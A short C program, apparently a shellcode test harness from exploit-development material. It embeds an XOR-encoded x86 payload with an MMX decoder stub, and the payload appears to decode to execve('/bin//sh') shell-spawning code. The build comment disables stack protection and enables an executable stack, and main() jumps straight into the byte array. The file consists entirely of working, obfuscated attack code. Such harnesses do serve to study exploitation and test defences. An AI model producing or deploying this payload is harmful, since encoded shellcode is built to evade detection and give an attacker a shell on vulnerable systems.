/*
A simple program to test shellcode
gcc -fno-stack-protector -z execstack tshell.c
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\xeb\x1b\x58\x8d\x58\x08\x31\xc9\xb1\x04\x0f\x6f\x00\x0f\x6f\x0b\x0f\xef\xc1\x0f"
"\x7f\x03\x83\xc3\x08\xe2\xef\xeb\x0d\xe8\xe0\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa"
"\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x1a\xa1\x23\x49\x67"
"\x2a";

main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
